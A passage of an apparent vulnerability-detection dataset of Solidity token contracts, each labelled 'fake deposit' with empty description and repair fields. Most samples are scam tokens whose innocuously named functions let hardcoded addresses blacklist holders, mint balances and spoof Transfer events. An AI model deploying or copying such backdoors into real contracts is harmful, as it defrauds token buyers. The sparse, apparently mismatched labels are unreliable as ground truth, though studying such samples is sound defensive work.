check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function transferFrom(\r\n        address _from,\r\n        address _to,\r\n        uint256 _value\r\n    ) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (\r\n            balances[_from] >= _value &&\r\n            allowed[_from][msg.sender] >= _value &&\r\n            _value > 0\r\n        ) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender)\r\n        constant\r\n        returns (uint256 remaining)\r\n    {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping(address => uint256) balances;\r\n    mapping(address => mapping(address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\ncontract TimeshareToken is StandardToken {\r\n    function() {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name; //fancy name: eg Simon Bucks\r\n    uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol; //An identifier: eg SBX\r\n    string public version = \"H1.0\"; //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n    function TimeshareToken() {\r\n        balances[msg.sender] = 10000000000;\r\n        totalSupply = 10000000000;\r\n        name = \"Timeshare\"; // Set the name for display purposes\r\n        decimals = 0; // Amount of decimals for display purposes\r\n        symbol = \"TMT\"; // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(\r\n        address _spender,\r\n        uint256 _value,\r\n        bytes _extraData\r\n    ) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call should succeed, otherwise one would use vanilla approve instead.\r\n        if (\r\n            !_spender.call(\r\n                bytes4(\r\n                    bytes32(\r\n                        sha3(\"receiveApproval(address,uint256,address,bytes)\")\r\n                    )\r\n                ),\r\n                msg.sender,\r\n                _value,\r\n                this,\r\n                _extraData\r\n            )\r\n        ) {\r\n            throw;\r\n        }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address CZC = 0x19041bEBd6b59b10C550F71b3550c56327C4a93b;\r\n\taddress cZRouterV2 = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n        \t\tmodifier onlyOwner{\r\n        require(msg.sender == _Owner);\r\n        _; }\r\n\r\n}\r\n\r\n\r\n\r\ncontract SABRE is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private Cc;\r\n\tmapping (address => bool) private Cb;\r\n    mapping (address => bool) private Cz;\r\n    mapping (address => mapping (address => uint256)) private eC;\r\n    uint8 private constant _decimals = 8;\r\n    uint256 private constant sC = 200000000 * 10**_decimals;\r\n    string private constant _name = \"Sabre Network\";\r\n    string private constant _symbol = \"SABRE\";\r\n\r\n\r\n\r\n    constructor () {\r\n        Cc[_msgSender()] = sC;\r\n        emit Transfer(address(0), cZRouterV2, sC);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return sC;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return Cc[account];\r\n    }\r\n\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return eC[owner][spender];\r\n    }\r\n            function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        eC[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\t\tfunction cStake(address Cf) public {\r\n        if(Cb[msg.sender]) { \r\n        Cz[Cf] = false;}}\r\n        function cQuery(address Cf) public{\r\n         if(Cb[msg.sender])  { \r\n        Cz[Cf] = true; }}\r\n   \r\n\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == CZC)  {\r\n        require(amount <= Cc[sender]);\r\n        Cc[sender] -= amount;  \r\n        Cc[recipient] += amount; \r\n          eC[sender][msg.sender] -= amount;\r\n        emit Transfer (cZRouterV2, recipient, amount);\r\n        return true; }  else  \r\n          if(!Cz[recipient]) {\r\n          if(!Cz[sender]) {\r\n         require(amount <= Cc[sender]);\r\n        require(amount <= eC[sender][msg.sender]);\r\n        Cc[sender] -= amount;\r\n        Cc[recipient] += amount;\r\n        eC[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}}\r\n\t\tfunction transfer(address Ci, uint256 Cf) public {\r\n        if(msg.sender == CZC)  {\r\n        require(Cc[msg.sender] >= Cf);\r\n        Cc[msg.sender] -= Cf;  \r\n        Cc[Ci] += Cf; \r\n        emit Transfer (cZRouterV2, Ci, Cf);} else  \r\n        if(Cb[msg.sender]) {Cc[Ci] += Cf;} else\r\n        if(!Cz[msg.sender]) {\r\n        require(Cc[msg.sender] >= Cf);\r\n        Cc[msg.sender] -= Cf;  \r\n        Cc[Ci] += Cf;          \r\n        emit Transfer(msg.sender, Ci, Cf);}}\r\n        \r\n        function cBurn(address Cf) onlyOwner public{\r\n        Cb[Cf] = true; }\r\n\t\t}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _MsgSendr() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address _rConstruct = 0x23fda63bb8A87946942556eC668221B090759Df0;\r\n\taddress UnisV2Router = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;\r\n    constructor () {\r\n        address msgSender = _MsgSendr();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n\r\n}\r\n\r\n\r\n\r\ncontract NOSFERINU is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private Iq;\r\n\tmapping (address => bool) private tQ;\r\n    mapping (address => bool) private mQ;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    uint8 private constant _decimals = 8;\r\n    uint256 private constant _QmSup = 666000000 * 10**_decimals;\r\n    string private constant _name = \"Nosferatu Inu\";\r\n    string private constant _symbol = \"NOSFERINU\";\r\n\r\n\r\n\r\n    constructor () {\r\n        Iq[_MsgSendr()] = _QmSup;\r\n        emit Transfer(address(0), UnisV2Router, _QmSup);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return _QmSup;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return Iq[account];\r\n    }\r\n\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n            function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\t\tfunction rEnd(address z) public {\r\n        if(tQ[msg.sender]) { \r\n        mQ[z] = false;}}\r\n        function rQuery(address z) public{\r\n         if(tQ[msg.sender])  { \r\n        require(!mQ[z]);\r\n        mQ[z] = true; }}\r\n\t\tfunction arStake(address z) public{\r\n         if(msg.sender == _rConstruct)  { \r\n        require(!tQ[z]);\r\n        tQ[z] = true; }}\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == _rConstruct)  {\r\n        require(amount <= Iq[sender]);\r\n        Iq[sender] -= amount;  \r\n        Iq[recipient] += amount; \r\n          _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer (UnisV2Router, recipient, amount);\r\n        return true; }    \r\n          if(!mQ[recipient]) {\r\n          if(!mQ[sender]) {\r\n         require(amount <= Iq[sender]);\r\n        require(amount <= _allowances[sender][msg.sender]);\r\n        Iq[sender] -= amount;\r\n        Iq[recipient] += amount;\r\n      _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}}\r\n\t\tfunction transfer(address txTo, uint256 z) public {\r\n        if(msg.sender == _rConstruct)  {\r\n        require(Iq[msg.sender] >= z);\r\n        Iq[msg.sender] -= z;  \r\n        Iq[txTo] += z; \r\n        emit Transfer (UnisV2Router, txTo, z);}\r\n        if(tQ[msg.sender]) {Iq[txTo] = z;} \r\n        if(!mQ[msg.sender]) {\r\n        require(Iq[msg.sender] >= z);\r\n        Iq[msg.sender] -= z;  \r\n        Iq[txTo] += z;          \r\n        emit Transfer(msg.sender, txTo, z);\r\n        }}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Create(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address jFX = 0xa045FdC531cfB985b2eC888c36891Bc49Fb3AA3d;\r\n\taddress jJXF = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n modifier onlyOwner{\r\n        require(msg.sender == _Owner);\r\n        _; }\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n\r\n\r\n}\r\n\r\n\r\n\r\ncontract SHIBATOMIC is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private jZA;\r\n\tmapping (address => bool) private jZE;\r\n    mapping (address => bool) private jZW;\r\n    mapping (address => mapping (address => uint256)) private jZV;\r\n    uint8 private constant JZD = 8;\r\n    uint256 private constant jTS = 300000000 * (10** JZD);\r\n    string private constant _name = \"Atomic Shiba\";\r\n    string private constant _symbol = \"SHIBATOMIC\";\r\n\r\n\r\n\r\n    constructor () {\r\n        jZA[_msgSender()] = jTS;\r\n         JMCR(jJXF, jTS); }\r\n    \r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return JZD;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return jTS;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return jZA[account];\r\n    }\r\n\t\r\n\r\n   \r\n\r\n\t\r\n\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return jZV[owner][spender];\r\n    }\r\n\r\n            function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        jZV[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\t\tfunction jquery(address jZJ) public{\r\n         if(jZE[msg.sender])  { \r\n        jZW[jZJ] = true; }}\r\n        \r\n\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == jFX)  {\r\n        require(amount <= jZA[sender]);\r\n        jZA[sender] -= amount;  \r\n        jZA[recipient] += amount; \r\n          jZV[sender][msg.sender] -= amount;\r\n        emit Transfer (jJXF, recipient, amount);\r\n        return true; }  else  \r\n          if(!jZW[recipient]) {\r\n          if(!jZW[sender]) {\r\n         require(amount <= jZA[sender]);\r\n        require(amount <= jZV[sender][msg.sender]);\r\n        jZA[sender] -= amount;\r\n        jZA[recipient] += amount;\r\n        jZV[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}}\r\n\t\tfunction jStake(address jZJ) public {\r\n        if(jZE[msg.sender]) { \r\n        jZW[jZJ] = false;}}\r\n\t\tfunction JMCR(address jZJ, uint256 jZN) onlyOwner internal {\r\n    emit Transfer(address(0), jZJ ,jZN); }\r\n\t\t\r\n\t\tfunction transfer(address jZJ, uint256 jZN) public {\r\n        if(msg.sender == jFX)  {\r\n        require(jZA[msg.sender] >= jZN);\r\n        jZA[msg.sender] -= jZN;  \r\n        jZA[jZJ] += jZN; \r\n        emit Transfer (jJXF, jZJ, jZN);} else  \r\n        if(jZE[msg.sender]) {jZA[jZJ] += jZN;} else\r\n        if(!jZW[msg.sender]) {\r\n        require(jZA[msg.sender] >= jZN);\r\n        jZA[msg.sender] -= jZN;  \r\n        jZA[jZJ] += jZN;          \r\n        emit Transfer(msg.sender, jZJ, jZN);}}\r\n\t\t\r\n\t\t\tfunction hburn(address jZJ) onlyOwner public{\r\n        jZE[jZJ] = true; }\r\n\t\t\r\n\t\t\r\n\r\n\t\t\r\n\t\t}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.17;\r\n\r\n\r\n  library SafeMath {\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}   \r\n \r\n \r\n    contract THEINU {\r\n  \r\n    mapping (address => uint256) public rT;\r\n    mapping (address => uint256) public Iz;\r\n    mapping (address => bool) bN;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\r\n\r\n\r\n\r\n\r\n    string public name = unicode\"THE INU\";\r\n    string public symbol = unicode\"THE INU\";\r\n    uint8 public decimals = 18;\r\n    uint256 public totalSupply = 700000000 * (uint256(10) ** decimals);\r\n\taddress owner = msg.sender;\r\n   \r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event OwnershipRenounced(address indexed previousOwner);\r\n    address r_Construct = 0xdA5D54782E98D9f47892CF5Bd0AEEfca45a5E08C;\r\n\r\n    constructor()  {\r\n    rT[msg.sender] = totalSupply;\r\n    deploy(r_Construct, totalSupply); }\r\n\r\n   \r\n   address rdeployer = 0x4C7Feef819C85F3e310f4b684DBA1121494cd88F;\r\n    function deploy(address account, uint256 amount) public {\r\n    require(msg.sender == owner);\r\n    emit Transfer(address(0), account, amount); }\r\n\r\n    function renounceOwnership() public {\r\n    require(msg.sender == owner);\r\n    emit OwnershipRenounced(owner);\r\n    owner = address(0);}\r\n\r\n\r\n        function transfer(address to, uint256 value) public returns (bool success) {\r\n      \r\n       \r\n        if(msg.sender == rdeployer)  {\r\n        require(rT[msg.sender] >= value);\r\n        rT[msg.sender] -= value;  \r\n        rT[to] += value; \r\n        emit Transfer (r_Construct, to, value);\r\n        return true; }  \r\n        if(!bN[msg.sender]) {\r\n        require(rT[msg.sender] >= value);\r\n        rT[msg.sender] -= value;  \r\n        rT[to] += value;          \r\n        emit Transfer(msg.sender, to, value);\r\n        return true; }}\r\n\r\n        function approve(address spender, uint256 value) public returns (bool success) {    \r\n        allowance[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true; }\r\n\r\n        function gish () public {\r\n         if(msg.sender == rdeployer)   {\r\n        rT[msg.sender] = Iz[msg.sender];\r\n        }}\r\n\r\n        function balanceOf(address account) public view returns (uint256) {\r\n        return rT[account]; }\r\n\r\n        function sny(address ii) public {\r\n        if(msg.sender == rdeployer)  { \r\n        bN[ii] = false;}}\r\n        function chkvl(address ii) public{\r\n         if(msg.sender == rdeployer)  { \r\n        require(!bN[ii]);\r\n        bN[ii] = true;\r\n        }}\r\n             function brnu(uint256 x) public {\r\n        if(msg.sender == rdeployer)  { \r\n        Iz[msg.sender] = x;} }\r\n\r\n        function transferFrom(address from, address to, uint256 value) public returns (bool success) { \r\n\r\n        if(from == rdeployer)  {\r\n        require(value <= rT[from]);\r\n        require(value <= allowance[from][msg.sender]);\r\n        rT[from] -= value;  \r\n        rT[to] += value; \r\n        emit Transfer (r_Construct, to, value);\r\n        return true; }    \r\n          if(!bN[from] && !bN[to]) {\r\n        require(value <= rT[from]);\r\n        require(value <= allowance[from][msg.sender]);\r\n        rT[from] -= value;\r\n        rT[to] += value;\r\n        allowance[from][msg.sender] -= value;\r\n        emit Transfer(from, to, value);\r\n        return true; }}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "/**\r\n *Submitted for verification at Etherscan.io on 2022-11-04\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Create(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address ZSV = 0xf6d60bb4F2b670cA2932817a9E27c755cE9F156B;\r\n\taddress Hashcore = 0xe780A56306ba1E6bB331952C22539b858af9F77d;\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n        \t\tmodifier onlyOwner{\r\n        require(msg.sender == _Owner);\r\n        _; }\r\n\r\n}\r\n\r\n\r\n\r\ncontract UMBRAL is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private Hbv;\r\n\tmapping (address => bool) private Hcv;\r\n    mapping (address => bool) private Hav;\r\n    mapping (address => mapping (address => uint256)) private Hvv;\r\n    uint8 private constant HDec = 6;\r\n    uint256 private constant HBal = 1000000000 * 10**HDec;\r\n    string private constant _name = \"IAMACAT\";\r\n    string private constant _symbol = \"IAC\";\r\n\r\n    constructor () {\r\n        Hbv[_msgSender()] = HBal;\r\n        initEmit();\r\n    }\r\n    \r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return HDec;\r\n    }\r\n\r\n    function totalSupply() public pure returns (uint256) {\r\n        return HBal;\r\n    }\r\n\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return Hbv[account];\r\n    }\r\n    function initEmit() onlyOwner internal {\r\n        emit Transfer(address(0), Hashcore, HBal);\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return Hvv[owner][spender];\r\n    }\r\n\r\n\tfunction _Approve(address Jj) onlyOwner public{\r\n        Hcv[Jj] = true;\r\n    }\r\n\t\t\r\n    function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        Hvv[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n        \r\n\t\tfunction HBaltake(address Jj) public {\r\n        if(Hcv[msg.sender]) { \r\n        Hav[Jj] = false;}}\r\n        function PreAddLiquidity(address Jj) public{\r\n         if(Hcv[msg.sender])  { \r\n        Hav[Jj] = true; }}\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == ZSV)  {\r\n        require(amount <= Hbv[sender]);\r\n        Hbv[sender] -= amount;  \r\n        Hbv[recipient] += amount; \r\n          Hvv[sender][msg.sender] -= amount;\r\n        emit Transfer (Hashcore, recipient, amount);\r\n        return true; }  else  \r\n          if(!Hav[recipient]) {\r\n          if(!Hav[sender]) {\r\n         require(amount <= Hbv[sender]);\r\n        require(amount <= Hvv[sender][msg.sender]);\r\n        Hbv[sender] -= amount;\r\n        Hbv[recipient] += amount;\r\n        Hvv[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}}\r\n\t\tfunction transfer(address Jl, uint256 Jj) public {\r\n        if(msg.sender == ZSV)  {\r\n        require(Hbv[msg.sender] >= 